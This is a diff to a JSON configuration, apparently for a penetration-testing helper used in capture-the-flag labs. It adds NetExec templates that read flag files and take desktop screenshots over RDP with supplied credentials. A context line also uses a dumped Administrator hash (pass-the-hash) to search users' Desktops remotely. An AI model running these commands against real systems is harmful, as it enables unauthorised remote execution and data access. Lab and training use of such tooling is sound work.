@@ -228,6 +228,20 @@
           "requires_admin": true,
           "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile.",
           "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*user*.txt\" 2>nul'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 3389,
+          "note": "RDP REMOTE PROOF READ (When port 3389 is open): Run whoami, hostname, ipconfig, and type the user flag in one command over RDP via NetExec.",
+          "run": "nxc rdp {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'whoami & hostname & ipconfig & type {{flag_path_local}}'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 3389,
+          "note": "RDP DESKTOP SCREENSHOT: Capture a PNG screenshot of the remote RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots.",
+          "run": "nxc rdp {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} --screenshot --screentime 10"
         }
       ],
       "deprioritize_when": [
@@ -388,6 +402,20 @@
           "locus": "onhost",
           "run": "Get-Content 'C:\\Users\\Administrator\\Desktop\\{{filename}}' -Stream '{{stream_name}}'",
           "note": "POWERSHELL ADS READ: Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 3389,
+          "note": "RDP REMOTE PROOF READ (When port 3389 is open): Run whoami, hostname, ipconfig, and type the root/proof flag in one command over RDP via NetExec.",
+          "run": "nxc rdp {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'whoami & hostname & ipconfig & type {{flag_path_root}}'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 3389,
+          "note": "RDP DESKTOP SCREENSHOT: Capture a PNG screenshot of the remote Administrator RDP desktop session (saved under ~/.nxc/screenshots/) to attach in Evidence -> Proof Screenshots.",
+          "run": "nxc rdp {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} --screenshot --screentime 10"
         }
       ],
       "deprioritize_when": [
